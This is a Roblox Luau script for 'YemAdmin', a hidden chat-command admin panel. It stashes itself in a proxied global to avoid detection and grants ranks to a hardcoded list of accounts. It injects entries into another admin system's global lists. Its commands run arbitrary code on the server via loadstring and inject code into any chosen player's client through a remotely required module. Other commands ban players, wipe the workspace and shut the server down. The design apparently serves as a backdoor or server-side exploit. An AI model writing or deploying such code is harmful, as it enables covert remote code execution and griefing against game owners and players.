--!strict
--!optimize 2
--!native
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")

local function NewGui(labels: {}): ScreenGui
	local cmdGui = Instance.new("ScreenGui")
	cmdGui.Name = "CMDSGUI"

	local mainButton = Instance.new("TextButton", cmdGui)
	mainButton.AutoButtonColor = false
	mainButton.Size = UDim2.new(0, 385, 0, 20)
	mainButton.BackgroundTransparency = 1
	mainButton.Text = ""
	mainButton.Position = UDim2.new(0.5, -200, 0.5, -200)
    Instance.new("UIDragDetector", mainButton)

	local mainFrame = Instance.new("Frame", mainButton)
	mainFrame.ZIndex = 7
	mainFrame.Style = Enum.FrameStyle.RobloxRound
	mainFrame.ClipsDescendants = true
	mainFrame.Size = UDim2.new(0, 400, 0, 400)

	local innerFrame = Instance.new("Frame", mainFrame)
	innerFrame.ZIndex = 8
	innerFrame.Position = UDim2.new(0, 0, 0, -9)

	local logLabel = Instance.new("TextLabel", innerFrame)
	logLabel.TextStrokeTransparency = 0.8
	logLabel.ZIndex = 8
	logLabel.TextXAlignment = Enum.TextXAlignment.Left
	logLabel.TextYAlignment = Enum.TextYAlignment.Top
	logLabel.TextSize = 18
	logLabel.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	logLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	logLabel.BackgroundTransparency = 1
	logLabel.Text = ""

	local baseLabel = Instance.new("TextLabel", innerFrame)
	baseLabel.TextStrokeTransparency = 0.8
	baseLabel.ZIndex = 8
	baseLabel.TextXAlignment = Enum.TextXAlignment.Left
	baseLabel.TextYAlignment = Enum.TextYAlignment.Top
	baseLabel.TextSize = 18
	baseLabel.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	baseLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	baseLabel.BackgroundTransparency = 1
	baseLabel.RichText = true
	baseLabel.Visible = false
	baseLabel.Name = "BaseLabel"
	baseLabel.Position = UDim2.new(0, 0, 0, 20)
	baseLabel.Text = "Some text here!"

    for i,v in ipairs(labels) do
        local newLabel = baseLabel:Clone()
        newLabel.RichText = true
        newLabel.Text = v
	    newLabel.Position = UDim2.new(0, 0, 0, i*20)
        newLabel.Visible = true
        newLabel.Parent = innerFrame
    end

	local closeButton = Instance.new("TextButton", mainFrame)
	closeButton.TextSize = 18
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	closeButton.ZIndex = 10
	closeButton.Size = UDim2.new(0, 20, 0, 20)
	closeButton.Text = "X"
	closeButton.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeButton.Position = UDim2.new(1, -15, 0, -5)
    closeButton.MouseButton1Click:Connect(function(...)
        cmdGui:Destroy()
    end)

	local imageButton = Instance.new("ImageButton", mainFrame)
	imageButton.ZIndex = 9
	imageButton.Image = "http://www.roblox.com/asset/?id=108326725"
	imageButton.Size = UDim2.new(0, 25, 0, 25)
	imageButton.BackgroundTransparency = 1
	imageButton.Visible = false
	imageButton.Position = UDim2.new(1, -20, 1, -20)

	return cmdGui
end
--NewGui({`I want the <font color="#FF7800">orange</font> candy.`, `I want the <font color="#0078FF">blue</font> candy.`}).Parent = game.Players.SnowClan_8342.PlayerGui

print'Started initialization of YemAdmin'
-- DEBUG CODE TO WIPE
if _G.yemdebug and _G.yem then
    _G.yem.eject()
    _G.yem = false -- wipe
end

-- cuz some people kept mapping it and i decided to be unfunny
if not _G.yem then
    local yemEnv = {}
    local proxy = newproxy(true)
    local proxyMt = getmetatable(proxy)

    proxyMt.__index = function(table,key)
        return yemEnv[key]
    end 
    proxyMt.__newindex = function(table,key,value)
        yemEnv[key] = value
    end 
    _G.yem = proxy
end

local GetEnv = function()
    return _G.yem
end

if not GetEnv().config then
    GetEnv().config = {
        prefix = "&"
    }
end

if not GetEnv().tempbans then
    GetEnv().tempbans = {}
end

if not GetEnv().tempblacklist then
    GetEnv().tempblacklist = {}
end

-- rank worth as a %percent%
local Ranks = {
    Developer = 100,
    Special = 80,
    Whitelist = 50
}

local RanksExtra = {
    Developer = {
        Colour = Color3.fromRGB(105, 47, 138)
    },
    Special = {
        Colour = Color3.fromRGB(110, 57, 57)
    },
    Whitelist = {
        Colour = Color3.fromHSV(0.692112, 0.539744, 0.7)
    }
}

local function RankToString(rank: number)
    for i,v in pairs(Ranks) do
        if rank == v then return i end
    end 
    return "Unknown"
end

local function RankToColour(rank: number)
    return RanksExtra[RankToString(rank)].Colour
end

-- expose just 2 be nice qt3.14's
GetEnv().runLua = function(caller: Player, code: string)
if not ServerScriptService:FindFirstChild("goog") then
        local ticking = tick()
        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = ServerScriptService:FindFirstChild("goog")
    local p = caller

    if not goog then
        warn("goog failed to be added, command can not continue")
        return
    end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr:WaitForChild("Exec").Value = code

    if p.Character then
        scr.Parent = p.Character
    else
        scr.Parent = p:WaitForChild("PlayerGui")
    end

    scr.Enabled = true
end

-- TODO: implement ranks (for whitelist cmd or smth)
if not GetEnv().tempwhitelist then
    GetEnv().tempwhitelist = {
        ["SnowClan_8342"] = {
            rank = Ranks.Developer,
            COMMENT = "Note that all a higher rank does is give me access to &whitelist so please either do it by hand or dont touch this!"
        },
        ["qwdssssfsdrfasd"] = {
            rank = Ranks.Special
        },
        ["yx_doomspire"] = {
            rank = Ranks.Special
        },
        ["idonthacklol101ns"] = {
            rank = Ranks.Special
        },
        ["AiphaGunner"] = {
            rank = Ranks.Special
        },
        ["trashmoderatio1n"] = {
            rank = Ranks.Special
        },
        ["xXRblxGamerRblxXx"] = {
            rank = Ranks.Special
        },
    }
end

if GetEnv().eject then
    GetEnv().eject()
end

local connections: {RBXScriptConnection} = {}
local isRunning = true
GetEnv().eject = function()
    isRunning = false
    for i,v in pairs(connections) do
        v:Disconnect()
    end
end

-- TODO: move to another luau file or smth
local Msg = function(caller: Player, msg: string)
    local msgInst = Instance.new("Message", caller.PlayerGui)
    msgInst.Text = msg
    task.wait(3)
    msgInst:Destroy()
end

local ClearWorkspace = function()
    for _, object in pairs(workspace:GetChildren()) do
        if object == workspace.Terrain or object == workspace.Tabby then continue end
        if Players:GetPlayerFromCharacter(object) then continue end
        
        object:Destroy()
    end
end

local getPlyr = function(name: string)
	local _name = string.lower(name)

	for _, player in ipairs(Players:GetPlayers()) do
		if string.find(string.lower(player.Name), _name, 1, true)
            or string.find(string.lower(player.DisplayName), _name, 1, true) then
			return player
		end
	end

	return nil
end

function E(text: string)
	return text:gsub('[&<>"\']',{
		['&'] = '&amp;',
		['<'] = '&lt;',
		['>'] = '&gt;',
		['"'] = '&quot;',
		['\''] = '&apos;',
	})
end

function C(text: string, colour: Color3)
    return `<font color="#{colour:ToHex()}">{text}</font>`
end

type UserList = { [number]: string }
type UserArray = { string }
type KickList = { any }--idc

type Settings = {
    Legacy_ExcludedUsers: UserList,
    af: boolean,
    CensoredUsers: UserList,
    tempadmins: UserList,
    Legacychatadmins: UserArray,
    tempkicked: KickList,
    Filterlegacychat: boolean,
    p299: UserList,
    permadmins: UserList,
    specialperms: UserList,
    BindPlayerChatted: (plyr: Player)->RBXScriptSignal,

    -- just so the errors stfu in ide :)
    yemdebug: boolean?,
}
local _G = _G :: Settings

local commands: {Command} = {}

type Command = {
    Name: string,
    Description: string,
    Arguments: string,
    MinimumRank: number,
    OnCalled: (... any)->()
}

print'initializing'
local AddCommand = function(minrank: number, name: string, desc: string, args: string, onCalled: (caller: Player, ... any)->())
	local tmpTbl: Command = {
		["Name"] = name,
		["Description"] = desc,
		["Arguments"] = args,
		["MinimumRank"] = minrank,
		["OnCalled"] = onCalled
	}
	table.insert(commands, tmpTbl)
end

local IssueCommand = function(caller: Player, command: string)
    local prefix = GetEnv().config.prefix
	if string.sub(command, 1, #prefix) == prefix then
		command = string.sub(command, #prefix + 1)
	end

	for i,cmd in ipairs(commands) do
		local commandSplit: {string} = string.split(command, " ")
        local cmdName = table.remove(commandSplit, 1)
        assert(cmdName ~= nil, `cmdName is for some reason nil (It cant be)`)

		if string.lower(cmdName) == cmd.Name then
            if GetEnv().tempwhitelist[caller.Name].rank < cmd.MinimumRank then
                return -- no permission
            end
			local s,r = pcall(function()
				cmd.OnCalled(caller, unpack(commandSplit))
			end)
			if s ~= true then
				Msg(caller, r)--was msg anyways
			end
		end 
	end
end

print'chat hooks'
local onPlayerChatted = function(plyr: Player, msg: string)
    if not isRunning then return end

    if not GetEnv().tempwhitelist[plyr.Name] then
        return -- verify has a rank first
    end

    local prefix = GetEnv().config.prefix
	if string.sub(msg, 1, #prefix) == prefix then
        IssueCommand(plyr, msg)
    end
end

table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
    if GetEnv().tempbans[plyr.Name] then
        plyr:Kick(GetEnv().tempbans[plyr.Name])
        return
    end

    if plyr.Name:lower():sub(1, 4) == "wiwo" then
        plyr:Kick("IP banned for racism!")
    end

    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
        onPlayerChatted(plyr, msg)
    end)
end))

table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
    local removal = {}
    
    for i, v in pairs(_G.tempadmins) do
        if GetEnv().tempblacklist[v] then
            table.insert(removal, i)
        end
    end

    for _, index in ipairs(removal) do
        table.remove(_G.tempadmins, index)
    end
end))

for i,plyr in pairs(Players:GetPlayers()) do
    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
        onPlayerChatted(plyr, msg)
    end)
end

--cmds
AddCommand(Ranks.Developer, "enr", "Enter debug mode", "<boolean>", function(caller: Player, value: string)
    _G.yemdebug = (value:lower() == "true")
end)

AddCommand(Ranks.Developer, "shutdown", "Emergency cleanup :)", "<...>", function(caller: Player, ...)
    local reason = table.concat({...}, " ")

    Players.PlayerAdded:Connect(function(a0: Player)
        a0:Kick(reason)
    end)

    for i,v in pairs(Players:GetPlayers()) do
        v:Kick(reason)
    end
end)

AddCommand(Ranks.Whitelist, "cmds", "Display a list of basic commands", "<>", function(caller: Player)
    local output: {string} = {}

    local prefix = GetEnv().config.prefix
    for i,cmd in ipairs(commands) do
		local cmdName = cmd["Name"]
        local cmdDescr = cmd["Description"]
        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#919191"))

        if GetEnv().tempwhitelist[caller.Name].rank < cmd.MinimumRank then
            cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#3b1212"))

            table.insert(output, `{C(prefix, Color3.fromHex("#491717"))}{C(cmdName, Color3.fromHex("#310000"))} {cmdArgs} {C(`- {cmdDescr}`, Color3.fromHex("#310000"))}`)
            continue
        end

        table.insert(output, `{C(prefix, Color3.fromHex("#738e99"))}{cmdName} {cmdArgs} - {cmdDescr}`)
	end

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(Ranks.Whitelist, "bans", "Display a list of banned players", "<>", function(caller: Player)
    local output: {string} = {}

    for i,plr in pairs(GetEnv().tempbans) do
        table.insert(output, `{C(i, Color3.fromHex("#997373"))} - reason: im to lazy to find it thanks`)
	end

    if #GetEnv().tempbans == 0 then
        table.insert(output, C("Oopsie daisy! theres no bans here silly.", Color3.fromHex("#6ab483")))
    end 

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(Ranks.Whitelist, "admins", "Display a list of admins", "<>", function(caller: Player)
    local output: {string} = {}

    local noDupe = {}
    for i,plr in pairs(_G.tempadmins) do
        if table.find(noDupe, plr) then continue end
        if not Players:FindFirstChild(plr) then continue end

        table.insert(noDupe, plr)

        local endStr: {string} = {}

        if table.find(_G.permadmins, plr) then -- is perm
            table.insert(endStr, C("Perm", Color3.fromHSV(0.398148, 0.546154, 0.4)))
        end
        
        if table.find(_G.p299, plr) then -- is persons/p299
            table.insert(endStr, C("P299", Color3.fromHSV(0.136132, 0.539744, 0.4)))
        end
        
        local plrData = GetEnv().tempwhitelist[plr]
        if plrData then -- is whitelist/whatrank
            table.insert(endStr, C(RankToString(plrData.rank), RankToColour(plrData.rank)))
        end

        table.insert(output, `{C(plr, Color3.fromHex("#c8c8c8"))} ({table.concat(endStr, ", ")})`)
	end

    NewGui(output).Parent = caller.PlayerGui
end)

AddCommand(Ranks.Whitelist, "clr", "Clear everything from workspace", "<>", ClearWorkspace)

AddCommand(Ranks.Whitelist, "kick", "Kick a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")

    local reason = table.concat({...}, " ")
    target:Kick(reason)
end)

AddCommand(Ranks.Special, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")

    local reason = `\n\n[YemAdmin]\nYou have been banned for:\n{table.concat({...}, " ")}`
    target:Kick(reason)
    GetEnv().tempbans[target.Name] = reason
end)

AddCommand(Ranks.Special, "unban", "Unban a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(GetEnv().tempbans) do
        if string.find(string.lower(i), plyr1, 1, true) then
            GetEnv().tempbans[i] = nil
            return
        end
    end
    error("User not found")
end)

AddCommand(Ranks.Whitelist, "blacklist", "Erase a players admin", "<plyr1>", function(caller: Player, plyr1: string)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")
    
    GetEnv().tempblacklist[target.Name] = {}
end)

AddCommand(Ranks.Whitelist, "unblacklist", "Unblacklists a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(GetEnv().tempblacklist) do
        if string.find(string.lower(i), plyr1, 1, true) then
            GetEnv().tempblacklist[i] = nil
            return
        end
    end
    error("User not found")
end)

AddCommand(Ranks.Special, "whitelist", "Give someone access (DANGEROUS)", "<plyr1>", function(caller: Player, plyr1: string)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")
    
    GetEnv().tempwhitelist[target.Name] = { rank = Ranks.Whitelist }
end)

AddCommand(Ranks.Whitelist, "perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr1: string)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")

    table.insert(_G.permadmins, target.Name)
    table.insert(_G.p299, target.Name)
    table.insert(_G.tempadmins, target.Name)
end)

AddCommand(Ranks.Special, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
    local code = table.concat({...}, " ")
    assert(code, "No code")
    
    local chunk, loadErr = loadstring(code, "Cattails")
    assert(chunk, `Script failed to execute; {loadErr}`)
    chunk()
end)

AddCommand(Ranks.Special, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local target = getPlyr(plyr1)
    assert(target, "Player not found")

    local code = table.concat({...}, " ")
    assert(code, "No code")

    GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
end)

AddCommand(Ranks.Whitelist, "tpall", "Move all players to this server", "<>", function(caller: Player)
    caller:Kick("dumbass actually tried")
end)

print'commands initialized'
